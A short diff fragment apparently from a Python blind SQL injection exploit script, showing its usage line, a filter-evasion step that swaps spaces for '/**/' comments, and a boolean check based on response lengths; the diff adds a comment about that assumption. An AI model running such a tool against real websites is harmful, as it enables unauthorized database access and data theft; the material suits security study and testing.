@@ -26,6 +26,7 @@ def main():
         print('(+) usage example: {} "http://localhost?param=" "select version()"'.format(sys.argv[0]))
     entry_point = sys.argv[1]
     query = sys.argv[2].replace(' ', '/**/')
+    # making assumption that True and False answers has different Content-Length header and True>False
     true_len=sqli_true_len(entry_point)
     false_len=sqli_false_len(entry_point)
     if (true_len==false_len):
